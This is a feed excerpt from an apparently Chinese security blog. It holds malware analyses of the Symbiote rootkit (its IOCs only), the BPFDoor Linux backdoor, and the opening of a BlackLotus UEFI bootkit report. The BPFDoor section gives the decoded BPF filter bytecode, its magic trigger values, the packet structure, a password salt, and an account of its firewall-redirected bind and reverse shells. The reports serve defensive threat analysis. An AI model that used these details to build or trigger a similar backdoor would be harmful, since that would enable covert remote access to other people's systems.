title="4.安全检测"></a>4.安全检测</h1><table><thead><tr><th>Hash</th><th>TopEDR检测</th><th>Yara检测</th></tr></thead><tbody><tr><td>59033839c1be695c83a68924979fab58</td><td>无</td><td>Topsec-Rootkit.Symbiote.Linux.June</td></tr></tbody></table><h1 id="4-IOC"><a href="#4-IOC" class="headerlink" title="4. IOC"></a>4. IOC</h1><p>59033839c1be695c83a68924979fab58<br>usr/include/java.h<br>suporte42caixa32<br>x3206.caixi.cx</p><h1 id="5-ATT-amp-CK矩阵"><a href="#5-ATT-amp-CK矩阵" class="headerlink" title="5. ATT&amp;CK矩阵"></a>5. ATT&amp;CK矩阵</h1><table><thead><tr><th>Tactic</th><th>ID</th><th>Name</th><th>Description</th></tr></thead><tbody><tr><td>Execution</td><td>T1059.004</td><td>Command and Scripting Interpreter： Unix Shell</td><td>执行shell脚本</td></tr><tr><td>Persistence</td><td>T1556.003</td><td>Modify Authentication Process： Pluggable Authentication Modules</td><td>拦截PAM证模块修改认证逻辑</td></tr><tr><td>Privilege Escalation</td><td>T1548.001</td><td>Abuse Elevation Control Mechanism： Setuid and Setgid</td><td>提权为root用户</td></tr><tr><td>Defense Evasion</td><td>T1564.001</td><td>Hidden Files and Directories</td><td>隐藏文件</td></tr></tbody></table>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;概述&quot;&gt;&lt;a href=&quot;#概述&quot; class=&quot;headerlink&quot; title=&quot;概述&quot;&gt;&lt;/a&gt;概述&lt;/h1&gt;&lt;p&gt;&amp;emsp;&amp;emsp;Symbiote由威胁情报公司BlackBerry和Intezer命名，原因是该恶意程序能够将自己隐藏在正在运行的进程或者网络流量中，像寄生虫一样耗尽受害者的资源。&lt;br&gt;&amp;emsp;&amp;emsp;Symbiote背后的组织在2021年11开始开发该恶意程序，主要用来攻击拉丁美洲的金融部门，包括巴西银行和Caixa银行。&lt;br&gt;&amp;emsp;&amp;emsp;Symbiote与其他Linux恶意程序不同之处在于它利用一个名为LD_PRELOAD的linux特性通过动态链接器将其加载到所有正在运行的进程中。&lt;/p&gt;
&lt;h1 id=&quot;2-样本详情&quot;&gt;&lt;a href=&quot;#2-样本详情&quot; class=&quot;headerlink&quot; title=&quot;2. 样本详情&quot;&gt;&lt;/a&gt;2. 样本详情&lt;/h1&gt;&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;文件名&lt;/th&gt;
&lt;th&gt;liblinux.so&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;&lt;tr&gt;
&lt;td&gt;Md5&lt;/td&gt;
&lt;td&gt;59033839c1be695c83a68924979fab58&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;文件类型&lt;/td&gt;
&lt;td&gt;Linux64共享库&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;&lt;/table&gt;</summary>
    
    
    
    <category term="APT分析报告" scheme="http://shxi.cc/categories/APT%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/"/>
    
    
    <category term="Symbiote" scheme="http://shxi.cc/tags/Symbiote/"/>
    
  </entry>
  
  <entry>
    <title>BPFdoor：隐形Linux恶意软件绕过防火墙进行远程访问</title>
    <link href="http://shxi.cc/post/b3bbba67.html"/>
    <id>http://shxi.cc/post/b3bbba67.html</id>
    <published>2023-10-14T06:53:57.000Z</published>
    <updated>2023-11-01T06:46:35.819Z</updated>
    
    <content type="html"><![CDATA[<h1 id="1-概述"><a href="#1-概述" class="headerlink" title="1.    概述"></a>1.    概述</h1><p>&emsp;&emsp;BPFDoor是专门为Linux和Solaris系统设计的后门程序，攻击者可以远程连接到linux shell以获得受害者设备的访问权限，背后所属的APT组织主要针对中东和亚洲的电信提供商以及政府、教育和物流部门的实体。<br>&emsp;&emsp;该后门滥用伯克利数据包过滤器(BPF)来监听网络和过滤网络数据包，这是BPFDoor名字的由来，也是2022年来被发现的第二个基于BPF进行攻击的恶意程序,第一个是由盘古实验室公布的NAS后门bvp47。<br>&emsp;&emsp;PWC研究人员将该恶意程序归因于来自中国的APT组织Red Menshen, 该APT组织为2021年被PWC命名，归因原因是该组织在后利用阶段使用了Gh0st后门变种以及Mimikatz和Metasploit等开源软件、攻击时间与中国地区工作时间吻合等原因。这种归因方式是信誉度比较低的，因为其他国家的APT组织有时也会使用Gh0st后门,比如朝鲜国家支持的APT组织Lazarus。</p><h1 id="2-样本详情"><a href="#2-样本详情" class="headerlink" title="2.    样本详情"></a>2.    样本详情</h1><table><thead><tr><th></th><th></th></tr></thead><tbody><tr><td>文件名</td><td>kdumpflush</td></tr><tr><td>Md5</td><td>156226c90974180cc4b5f9738e80f1f8</td></tr><tr><td>文件类型</td><td>ELF64</td></tr></tbody></table><h1 id="3-流程图"><a href="#3-流程图" class="headerlink" title="3.    流程图"></a>3.    流程图</h1><img src="/post/b3bbba67/clip_image001.png" class="" title="example"><span id="more"></span><h1 id="4-详细分析"><a href="#4-详细分析" class="headerlink" title="4.    详细分析"></a>4.    详细分析</h1><p>&emsp;&emsp;BPFDoor不受防火墙规则的约束，并持续监听来自ICMP、UDP和TCP端口的数据包。当接收到包含特定数据的TCP或UDP数据包时，密码验证通过后执行后门操作，比如创建远程shell、修改防火墙规则等等。<br>&emsp;&emsp;使用BPF数据包过滤的方式无需开启入站端口、也不使用出站端口，因此无法被防火墙阻止，并且可以响应来自网络上任意IP地址的命令，非常适合隐身操作。<br>&emsp;&emsp;并且大部分linux操作系统都内置BPF的功能,因此执行数据包过滤所需的CPU开销较小。<br>&emsp;&emsp;BPFDoor使用动态编译时编译后的文件很小,只有几十K;目前发现BPFDoor存在Linux和Solaris SPARC两种系统版本。</p><h2 id="4-1-判断lock文件是否存在"><a href="#4-1-判断lock文件是否存在" class="headerlink" title="4.1 判断lock文件是否存在"></a>4.1 判断lock文件是否存在</h2><p>&emsp;&emsp;恶意程序在执行后会创建一个0字节的文件”auditd.lock”，用于标识恶意程序已经在执行中，再次执行时则检测”auditd.lock”是否存在，如果存在则退出程序。<br>&emsp;&emsp;恶意程序还会执行getuid来判断当前用户是否时root用户,如果不是的话则退出程序,因为后续需要执行的操作需要足够的权限才能够执行。<br><img src="b3bbba67/clip_image003.png"><br>&emsp;&emsp;在节4.2的文件kdumpflush执行并将自身进程名修改成硬编码的linux daemon进程后，恶意程序创建SIGTERM信号处理恶意程序在正常结束程序时删除文件”auditd.lock”,但是非正常结束程序可能会留下该文件，比如出现强制关机或系统崩溃等问题。<br>&emsp;&emsp;如果存在 “auditd.lock” 文件将不会启动，因为该文件用于标记恶意程序可能已经在执行中。<br><img src="b3bbba67/clip_image005.png"><br>&emsp;&emsp;当触发进程结束信号时判断程序程序pid是否是运行的恶意程序的pid，如果是则删除标记文件”auditd.lock”。<br><img src="b3bbba67/clip_image007.png"></p><h2 id="4-2-进程伪装"><a href="#4-2-进程伪装" class="headerlink" title="4.2 进程伪装"></a>4.2 进程伪装</h2><p>&emsp;&emsp;根据是否携带命令行参数来决定执行不同的操作，第一次执行时没有携带命令行参数，执行的操作是将自身拷贝到目录”/var/lock”并重命名为” kdumpflush”，设置权限为755，执行kdumpflush并执行命令行参数”init”。<br>&emsp;&emsp;路径“/var/lock”是程序保存锁定文件的地方，用于标记它们正在使用某个特定的设备或者文件，其他程序发现锁定文件时，将不再试图使用这个设备或者文件。<br><img src="b3bbba67/clip_image009.png"><br>&emsp;&emsp;执行kdumpflash携带命令行参数”–init”，这时执行的操作是从10个硬编码的进程名中随机挑选一个进行伪装，然后调用函数daemon以守护进程的方式在后台执行，并将该程序的当前工作目录用函数chdir修改为目录”/”。<br>&emsp;&emsp;如下图所示，这些名称看起来像常见的Linux系统的daemon程序，恶意程序会用这些进程名的其中一个来覆盖参数argv[0]的值。<br><img src="b3bbba67/clip_image011.png"></p><p>&emsp;&emsp;进程伪装实现如下，使用伪装进程名覆盖argv[0],然后使用函数prctl设置当前运行程序的程序名。当使用命令ps查询进程时显示的是伪装后的进程名。<br><img src="b3bbba67/clip_image013.png"></p><h2 id="4-3-修改文件时间戳"><a href="#4-3-修改文件时间戳" class="headerlink" title="4.3 修改文件时间戳"></a>4.3 修改文件时间戳</h2><p>&emsp;&emsp;恶意程序将自身复制到路径”/dev/shm/kdmtmpflush”后，恶意程序修改该文件的时间戳为1225394236,转换成北京时间为 <strong>2008-10-31 03:17:16</strong>,修改文件时间戳的目的是为了隐藏对文件的修改痕迹。<br><img src="b3bbba67/clip_image015.png"></p><h2 id="4-4-BPF过滤器安装和激活"><a href="#4-4-BPF过滤器安装和激活" class="headerlink" title="4.4 BPF过滤器安装和激活"></a>4.4 BPF过滤器安装和激活</h2><p>&emsp;&emsp;恶意程序在完成前述所有工作后进入函数packet_loop，packet_loop函数实现BPF过滤器的激活和解析数据包等等。<br>&emsp;&emsp;恶意程序使用AF_PACKET地址簌打开一个类型为SOCK_RAW的套接字，以便它可以监听网络流量并应用BPF数据包过滤器，BPF会根据g_bpfcode来允许或禁止某些类型的数据通过socket，因此恶意程序只需要对通过过滤器的数据包进行处理而不用处理所有的数据包。<br><img src="b3bbba67/clip_image017.png"><br>&emsp;&emsp;使用函数setsockopt来安装BPF过滤器，BPF使用的过滤器被以字节码的方式加载。字节码g_bpfcode如下图:<br><img src="b3bbba67/clip_image019.png"><br>&emsp;&emsp;转换成BPF字节码如下,其中 注释为功能描述，在BPF汇编中使用A作为累加器,X为寄存器，引用的内存数据为监听到的数据包内容。</p><figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 12为EtherType在Ethernet的偏移，加载该值到A</span></span><br><span class="line"><span class="symbol">l0:</span>  ldh [<span class="number">12</span>]  </span><br><span class="line"><span class="comment">//判断EtherType是否为IPv4,是则跳转到l2否则跳转到l29</span></span><br><span class="line"><span class="symbol">l1:</span>  jeq <span class="meta">#0x800, l2, l29 </span></span><br><span class="line"><span class="comment">//14为Ipv4在Ethernet的偏移,9为Protocol在Ipv4的偏移,加载该值到A</span></span><br><span class="line"><span class="symbol">l2:</span>   ldb [<span class="number">23</span>]               </span><br><span class="line"><span class="comment">//如果Protocol等于UDP跳转到l4,否则跳转到l9。</span></span><br><span class="line"><span class="symbol">l3:</span>   jeq <span class="meta">#0x11, l4, l9      </span></span><br><span class="line"><span class="comment">// 读取fragment偏移</span></span><br><span class="line"><span class="symbol">l4:</span>   ldh [<span class="number">20</span>]               </span><br><span class="line"><span class="comment">// 如果fragment偏移不等于0跳转到l29</span></span><br><span class="line"><span class="symbol">l5:</span>   jset <span class="meta">#0x1fff, l29, l6  </span></span><br><span class="line"><span class="comment">//获取ipv4头部长度保存到寄存器X</span></span><br><span class="line"><span class="symbol">l6:</span>   ldxb <span class="number">4</span>*([<span class="number">14</span>]<span class="variable">&amp;0xf</span>)      </span><br><span class="line"><span class="comment">//读取UDP 的datagram数据保存到A</span></span><br><span class="line"><span class="symbol">l7:</span>   ldh [x+<span class="number">22</span>]             </span><br><span class="line"><span class="comment">//如果A等于0x7255跳转到l28,否则l29</span></span><br><span class="line"><span class="symbol">l8:</span>   jeq <span class="meta">#0x7255, l28, l29  </span></span><br><span class="line"><span class="comment">//如果Protocol等于ICMP，跳转到l10，否则跳转到l17。</span></span><br><span class="line"><span class="comment">//该位置是由l13跳转过来的,因此A为ipv4 protocol的值</span></span><br><span class="line"><span class="symbol">l9:</span>   jeq <span class="meta">#0x1, l10, l17     </span></span><br><span class="line"><span class="comment">// 读取fragment偏移</span></span><br><span class="line"><span class="symbol">l10:</span>  ldh [<span class="number">20</span>]               </span><br><span class="line"><span class="comment">// 如果fragment偏移不等于0跳转到l29</span></span><br><span class="line"><span class="symbol">l11:</span>  jset <span class="meta">#0x1fff, l29, l12 </span></span><br><span class="line"><span class="comment">// 读取IP层头部长度</span></span><br><span class="line"><span class="symbol">l12:</span>  ldxb <span class="number">4</span>*([<span class="number">14</span>]<span class="variable">&amp;0xf</span>)     </span><br><span class="line"><span class="comment">// 读取ICMP数据</span></span><br><span class="line"><span class="symbol">l13:</span>  ldh [x+<span class="number">22</span>]            </span><br><span class="line"><span class="comment">// 判断ICMP第一个word值是否为0x7255,如果时跳转l15否则跳转l29</span></span><br><span class="line"><span class="symbol">l14:</span>  jeq <span class="meta">#0x7255, l15, l29 </span></span><br><span class="line"><span class="comment">// 读取ICMP类型</span></span><br><span class="line"><span class="symbol">l15:</span>  ldb [x+<span class="number">14</span>]    </span><br><span class="line"><span class="comment">//判断ICMP类型是否是ping，如果是跳转到l28，否则跳转l29。</span></span><br><span class="line"><span class="symbol">l16:</span>  jeq <span class="meta">#0x8, l28, l29     </span></span><br><span class="line"><span class="comment">//如果protocol为TCP跳转到l18，否则l29。</span></span><br><span class="line"><span class="symbol">l17:</span>  jeq <span class="meta">#0x6, l18, l29     </span></span><br><span class="line"><span class="comment">// 读取fragment偏移</span></span><br><span class="line"><span class="symbol">l18:</span>  ldh [<span class="number">20</span>]               </span><br><span class="line"><span class="comment">// 如果fragment偏移不等于0跳转到l29</span></span><br><span class="line"><span class="symbol">l19:</span>  jset <span class="meta">#0x1fff, l29, l20 </span></span><br><span class="line"><span class="comment">// 读取IP层头部长度</span></span><br><span class="line"><span class="symbol">l20:</span>  ldxb <span class="number">4</span>*([<span class="number">14</span>]<span class="variable">&amp;0xf</span>)      </span><br><span class="line"><span class="comment">// 读取TCP segment偏移</span></span><br><span class="line"><span class="symbol">l21:</span>  ldb [x+<span class="number">26</span>]          </span><br><span class="line"><span class="comment">//计算TCP手机壳i【哦啊木哦</span></span><br><span class="line"><span class="symbol">l22:</span>  and <span class="meta">#0xf0</span></span><br><span class="line"><span class="comment">//计算TCP头部长度            </span></span><br><span class="line"><span class="symbol">l23:</span>  rsh <span class="meta">#2                 </span></span><br><span class="line"><span class="symbol">l24:</span>  add x </span><br><span class="line"><span class="symbol">l25:</span>  tax        </span><br><span class="line"><span class="comment">// A = halfword from packet offset X+14 (14 is ethernet header, x is IPv4+TCP header, so this offset is first TCP payload byte)</span></span><br><span class="line"><span class="symbol">l26:</span>  ldh [x+<span class="number">14</span>] </span><br><span class="line"><span class="comment">//如果A==0x5293跳转到分支l28否则跳转分支l29</span></span><br><span class="line"><span class="symbol">l27:</span>  jeq <span class="meta">#0x5293, l28, l29</span></span><br><span class="line"><span class="comment">// 命中返回非0值</span></span><br><span class="line"><span class="symbol">l28:</span>  ret <span class="meta">#0xffff            </span></span><br><span class="line"><span class="comment">// 未命中返回0</span></span><br><span class="line"><span class="symbol">l29:</span>  ret <span class="meta">#0 </span></span><br></pre></td></tr></table></figure><p>&emsp;&emsp;反汇编后的汇编代码可读性很差，使用伪代码来表示大致代码如下</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(EtherType != IPv4)</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line"><span class="keyword">if</span>(数据包为IP层分片包的一部分)</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line"><span class="comment">//验证magic字节</span></span><br><span class="line"><span class="keyword">if</span>(protocol==udp&amp;&amp; data[<span class="number">0</span>:<span class="number">2</span>]==<span class="number">0x7255</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line"><span class="keyword">if</span>(protocol==ICMP&amp;&amp;data[<span class="number">0</span>:<span class="number">2</span>]==<span class="number">0x7255</span> &amp;&amp; ICMP类型==Echo请求)</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line"><span class="keyword">if</span>(protocol==TCP&amp;&amp;data[<span class="number">0</span>:<span class="number">2</span>]==<span class="number">0x5293</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">false</span>;</span><br></pre></td></tr></table></figure><p>&emsp;&emsp;数据包通过BPF过滤器后使用结构体sniff_ethernet、sniff_tcp、sniff_udp和sniff_icmp来解析对应的数据包找到payload数据，payload使用结构体magic_packet，内存布局如下：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">struct</span> <span class="title class_">magic_packet</span>&#123;</span><br><span class="line">   <span class="type">unsigned</span> <span class="type">int</span>    flag;</span><br><span class="line">   <span class="type">in_addr_t</span>       ip;<span class="comment">//攻击者IP</span></span><br><span class="line">   <span class="type">unsigned</span> <span class="type">short</span>  port;<span class="comment">//攻击者使用的端口</span></span><br><span class="line">   <span class="type">char</span>   pass[<span class="number">14</span>];<span class="comment">//验证密码</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>&emsp;&emsp;由于不同的协议magicPacket所处的位置不一样，需要解析协议找到payload部分。<br><img src="b3bbba67/clip_image021.png"></p><h2 id="4-5-防火墙绕过"><a href="#4-5-防火墙绕过" class="headerlink" title="4.5 防火墙绕过"></a>4.5 防火墙绕过</h2><h3 id="1-匹配连接密码"><a href="#1-匹配连接密码" class="headerlink" title="1. 匹配连接密码"></a>1. 匹配连接密码</h3><p>&emsp;&emsp;BPF过滤器在防火墙之前接收或丢弃捕获的数据包，因此即使防火墙正在运行，恶意程序也会接收到包含由特定数据的数据包。<br>&emsp;&emsp;如果防火墙只允许部分端口通过，比如3306、443或80等等，攻击者也能向该端口通过发送包含特定数据的数据包来激活后门功能。<br>&emsp;&emsp;恶意程序收到包含特定数据的数据包后，从该数据中提取攻击者的IP地址，如果没指定则从数据包的IP协议层读取IP地址。恶意程序利用fork函数创建一个用于进程用于与攻击者进行通信，将其进程名修改为”usr/libexec/postfix/master”。<br>&emsp;&emsp;要想成功执行命令，还需要验证密码，密码由接收到的magicPacket包中提供。 该密码不仅是数据包验证密码，还作为恶意程序使用RC4算法加密通信流量的密钥。<br><img src="b3bbba67/clip_image023.png"><br>&emsp;&emsp;恶意程序硬编码了两个密码的md5值，由于使用的是不对称加密方式，很难解密出使用的原密码。密码验证如下，将从magicPacket获取到的密码拼接到字符串” I5*AYbs@LdaWbsO”然后计算md5值，然后判断是否与内置的密码匹配。<br><img src="b3bbba67/clip_image025.png"><br>&emsp;&emsp;恶意程序根据匹配结果的不同来执行不同的操作。如果密码匹配失败，发送一个值为”1”的udp数据包，这可能是在检测恶意程序是否存活；匹配pass2则建立本地binds hell。匹配pass1成功则建立反向bindshell连接指定的ip和端口。<br><img src="b3bbba67/clip_image027.png"></p><h3 id="2-BindShell"><a href="#2-BindShell" class="headerlink" title="2. BindShell"></a>2. BindShell</h3><h4 id="2-1-本地BindShell"><a href="#2-1-本地BindShell" class="headerlink" title="2.1 本地BindShell"></a>2.1 本地BindShell</h4><p>&emsp;&emsp;恶意程序从端口42391到43390一次选择一个端口用于创建本地bindShell，然后修改防火墙规则将来自攻击者的IP的所有流量从请求的端口重定向到选择的端口。<br><img src="b3bbba67/clip_image029.png"><br>&emsp;&emsp;修改的防火墙规则如下，在创建bindshell之前添加防火墙规则用于接收和重定向来自攻击者的流量，在接收数据后删除添加的两条防火墙规则避免被发现。这种数据包重定向的方法比较隐蔽，也更难找到，因为它能够重定向许多使用常用端口的数据流量,比如ssh、https和mysql等应用使用的端口，用抓包软件抓包的流量看起来就像是合法的流量。<br><img src="b3bbba67/clip_image031.png"></p><h4 id="2-2-反向BindShell"><a href="#2-2-反向BindShell" class="headerlink" title="2.2 反向BindShell"></a>2.2 反向BindShell</h4><p>&emsp;&emsp;如果数据包magicPacket中的地址_ip2为不为空或0xFFFFFFFF，则向该地址发送ICMP数据包来转发恶意程序接收到的magicPacket和当前进程PID；否则就是恶意程序主动连接magicPacket中指定的攻击者IP和端口然后创建BindShell。<br><img src="b3bbba67/clip_image033.png"> </p><h4 id="2-3-创建BindShell"><a href="#2-3-创建BindShell" class="headerlink" title="2.3 创建BindShell"></a>2.3 创建BindShell</h4><p>&emsp;&emsp;当前进程是被伪装成”usr/libexec/postfix/master”来执行的，该进程fork出一个子进程用于执行shell操作，并且进程名伪装成”qmgr -l -t fifo -u”，设置了一些环境变量告知shell不要记录某些信息。<br><img src="b3bbba67/clip_image035.png"><br>&emsp;&emsp;Linux恶意程序进程使用的shell一般都是通过管道来输入输出，对于一些需要编辑修改数据的shell命令就无法正常使用了，BPFdoor的方法就是创建伪终端来执行shell命令。<br>&emsp;&emsp;当要执行的命令字符中包含字符’\v’时执行修改伪终端窗口大小，然后再执行shell命令。分隔符’\v’前面四个字节指定要设置的窗口大小，后门字符为要执行的shell命令。<br>&emsp;&emsp;攻击者与受害者之间shell通信流量使用RC4算法加密，密钥由接收的magicPacket数据包中的字段pass指定。<br><img src="b3bbba67/clip_image037.png"></p><h1 id="6-IOC"><a href="#6-IOC" class="headerlink" title="6.    IOC"></a>6.    IOC</h1><p>/var/run/auditd.lock<br>Kdumpflush<br>156226c90974180cc4b5f9738e80f1f8</p><h1 id="7-ATT-amp-CK矩阵"><a href="#7-ATT-amp-CK矩阵" class="headerlink" title="7.    ATT&amp;CK矩阵"></a>7.    ATT&amp;CK矩阵</h1><table><thead><tr><th></th><th></th><th></th><th></th></tr></thead><tbody><tr><td>Tactic</td><td>ID</td><td>Name</td><td>Description</td></tr><tr><td>Execution</td><td>T1059.004</td><td>Command and Scripting Interpreter：Unix Shell</td><td>执行unix shell命令</td></tr><tr><td></td><td>T1204.002</td><td>User Execution: Malicious File</td><td>受害者执行恶意文件</td></tr><tr><td>Persistence</td><td>T1205.001</td><td>Traffic Signaling :Port Knocking</td><td>使用PortKnocking技术来激活后门程序</td></tr><tr><td>Defense Evasion</td><td>T1562.004</td><td>Impair Defenses:<br><br>Disable or Modify System Firewall</td><td>修改防火墙规则重定向通信流量数据</td></tr><tr><td></td><td>T1070.004</td><td>Indicator Removal on Host: File Deletion</td><td>删除锁定文件auditd.lock</td></tr><tr><td></td><td>T1070.006</td><td>Indicator Removal on Host: Timestomp</td><td>修改文件时间</td></tr><tr><td></td><td>T1036</td><td>Masquerading</td><td>进程伪装成linux daemon程序。</td></tr></tbody></table><h1 id="8-参考"><a href="#8-参考" class="headerlink" title="8. 参考"></a>8. 参考</h1><p><a href="https://www.tcpdump.org/pcap.html">https://www.tcpdump.org/pcap.html</a><br><a href="https://www.kernel.org/doc/Documentation/networking/filter.txt">https://www.kernel.org/doc/Documentation/networking/filter.txt</a><br><a href="https://www.sandflysecurity.com/blog/bpfdoor-an-evasive-linux-backdoor-technical-analysis/">https://www.sandflysecurity.com/blog/bpfdoor-an-evasive-linux-backdoor-technical-analysis/</a><br><a href="https://www.countercraftsec.com/blog/a-step-by-step-bpfdoor-compromise/">https://www.countercraftsec.com/blog/a-step-by-step-bpfdoor-compromise/</a></p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;1-概述&quot;&gt;&lt;a href=&quot;#1-概述&quot; class=&quot;headerlink&quot; title=&quot;1.    概述&quot;&gt;&lt;/a&gt;1.    概述&lt;/h1&gt;&lt;p&gt;&amp;emsp;&amp;emsp;BPFDoor是专门为Linux和Solaris系统设计的后门程序，攻击者可以远程连接到linux shell以获得受害者设备的访问权限，背后所属的APT组织主要针对中东和亚洲的电信提供商以及政府、教育和物流部门的实体。&lt;br&gt;&amp;emsp;&amp;emsp;该后门滥用伯克利数据包过滤器(BPF)来监听网络和过滤网络数据包，这是BPFDoor名字的由来，也是2022年来被发现的第二个基于BPF进行攻击的恶意程序,第一个是由盘古实验室公布的NAS后门bvp47。&lt;br&gt;&amp;emsp;&amp;emsp;PWC研究人员将该恶意程序归因于来自中国的APT组织Red Menshen, 该APT组织为2021年被PWC命名，归因原因是该组织在后利用阶段使用了Gh0st后门变种以及Mimikatz和Metasploit等开源软件、攻击时间与中国地区工作时间吻合等原因。这种归因方式是信誉度比较低的，因为其他国家的APT组织有时也会使用Gh0st后门,比如朝鲜国家支持的APT组织Lazarus。&lt;/p&gt;
&lt;h1 id=&quot;2-样本详情&quot;&gt;&lt;a href=&quot;#2-样本详情&quot; class=&quot;headerlink&quot; title=&quot;2.    样本详情&quot;&gt;&lt;/a&gt;2.    样本详情&lt;/h1&gt;&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;&lt;/th&gt;
&lt;th&gt;&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;&lt;tr&gt;
&lt;td&gt;文件名&lt;/td&gt;
&lt;td&gt;kdumpflush&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Md5&lt;/td&gt;
&lt;td&gt;156226c90974180cc4b5f9738e80f1f8&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;文件类型&lt;/td&gt;
&lt;td&gt;ELF64&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;&lt;/table&gt;
&lt;h1 id=&quot;3-流程图&quot;&gt;&lt;a href=&quot;#3-流程图&quot; class=&quot;headerlink&quot; title=&quot;3.    流程图&quot;&gt;&lt;/a&gt;3.    流程图&lt;/h1&gt;&lt;img src=&quot;/post/b3bbba67/clip_image001.png&quot; class=&quot;&quot; title=&quot;example&quot;&gt;</summary>
    
    
    
    <category term="APT分析报告" scheme="http://shxi.cc/categories/APT%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/"/>
    
    
    <category term="BPFDoor" scheme="http://shxi.cc/tags/BPFDoor/"/>
    
  </entry>
  
  <entry>
    <title>BlackLotus 首个绕过安全启动的UEFI bootkit(下)</title>
    <link href="http://shxi.cc/post/603ce62c.html"/>
    <id>http://shxi.cc/post/603ce62c.html</id>
    <published>2023-03-17T02:56:09.000Z</published>
    <updated>2023-10-17T06:56:45.689Z</updated>
    
    <content type="html"><![CDATA[<h1 id="1-概述"><a href="#1-概述" class="headerlink" title="1.   概述"></a>1.   概述</h1><p>&emsp;&emsp;在上一篇报告中已经详细分析了bootkit的安装过程, 本篇报告主要针对已经部署的bootkit进行进一步的详细分析。</p><h1 id="2-详细分析"><a href="#2-详细分析" class="headerlink" title="2.详细分析"></a>2.详细分析</h1><h2 id="1-bootmgrfw-efi分析"><a href="#1-bootmgrfw-efi分析" class="headerlink" title="1. bootmgrfw.efi分析"></a>1. bootmgrfw.efi分析</h2><p>         BlackLotus使用自签名的恶意EFI应用替换了原文件bootmgrfw.efi,将源文件重命名为winload.efi, 替换后的执行流程如下图:<br> <img src="/post/603ce62c/clip_image001.png" class="" title="example"></p><span id="more"></span><p>&emsp;&emsp;BlackLotus针对受害者机器是否开启安全启动执行不同的部署行为, 当目标机器开启了安全启动时, 安装程序释放用于绕过安全启动的多个组件,  在受害者机器上用于系统启动的EFI应用也有可能已经修复了有关漏洞, 攻击者为了确保bootkit能够安装成功, 用包含漏洞的bootmgr等EFI应用进行利用绕过安全启动。<br>&emsp;&emsp;在绕过安全启动后, 对bootmgr.efi、bootmgrfw.efi和winload.efi等程序执行HOOK来获得在不同阶段获得执行恶意代码的机会, 最后解密恶意驱动并映射到内存中, 修改disk.sys的入口点为恶意驱动入口点, 当恶意驱动执行完后执行disk.sys的入口点。恶意驱动解密PE文件并注入到系统进程winlogo.exe。</p><h3 id="1-关闭基于虚拟化的安全功能-vbs"><a href="#1-关闭基于虚拟化的安全功能-vbs" class="headerlink" title="1.关闭基于虚拟化的安全功能(vbs)"></a>1.关闭基于虚拟化的安全功能(vbs)</h3><p>&emsp;&emsp;为了绕过基于虚拟化的安全对恶意驱动的检测, 使用设置EFI变量VbsPolicyDisabled的方式关闭该功能。<br><img src="603ce62c/clip_image003.png"></p><h3 id="2-加载winload-efi"><a href="#2-加载winload-efi" class="headerlink" title="2.加载winload.efi"></a>2.加载winload.efi</h3><p>&emsp;&emsp;加载winload.efi到内存中用于执行正常的操作系统启动流程。<br><img src="603ce62c/clip_image005.png" alt=" "></p><h3 id="3-hook程序winload-efi函数"><a href="#3-hook程序winload-efi函数" class="headerlink" title="3.hook程序winload.efi函数"></a>3.hook程序winload.efi函数</h3><p>&emsp;&emsp;对winload.efi(原bootmgrfw.efi)程序的函数进行hook, 